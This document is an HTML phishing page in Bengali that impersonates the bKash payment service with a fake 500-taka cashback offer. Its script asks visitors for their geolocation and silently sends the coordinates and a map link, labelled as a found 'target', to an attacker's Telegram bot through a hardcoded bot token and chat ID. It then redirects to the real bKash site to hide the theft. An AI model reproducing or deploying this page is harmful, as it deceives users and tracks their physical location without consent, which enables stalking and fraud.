<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>বিকাশ ক্যাশব্যাক অফার ২০২৬</title>
    <style>
        body { font-family: 'Arial', sans-serif; background-color: #f1f1f1; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); text-align: center; max-width: 350px; }
        img { width: 120px; margin-bottom: 20px; }
        h2 { color: #d12053; margin-bottom: 10px; }
        p { color: #333; font-size: 16px; margin-bottom: 25px; }
        .btn { background: #d12053; color: white; padding: 12px 25px; border: none; border-radius: 25px; font-size: 18px; cursor: pointer; text-decoration: none; display: inline-block; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.bkash.com/uploads/2021/01/bKash-Logo.png" alt="bKash">
        <h2>৫০০ টাকা বোনাস!</h2>
        <p>আপনার নম্বরটি অফারের জন্য যোগ্য। পেমেন্টটি রিসিভ করতে আপনার লোকেশন কনফার্ম করুন।</p>
        <button class="btn" onclick="askLocation()">বোনাস গ্রহণ করুন</button>
    </div>
    <script>
        const BOT_TOKEN = '8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k';
        const CHAT_ID = '7887080882';
        function askLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendData, showError);
            }
        }
        function sendData(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const msg = `📍 টার্গেট পাওয়া গেছে!\n\nLatitude: ${lat}\nLongitude: ${lon}\n\nMap: https://www.google.com/maps?q=${lat},${lon}`;
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`)
            .then(() => {
                alert("লোকেশন ভেরিফিকেশন সফল! ৩-৫ মিনিটের মধ্যে বোনাস চলে আসবে।");
                window.location.href = "https://www.bkash.com";
            });
        }
        function showError() {
            alert("দুঃখিত, লোকেশন Allow না করলে বোনাস পাওয়া সম্ভব নয়।");
        }
    </script>
</body>
</html>
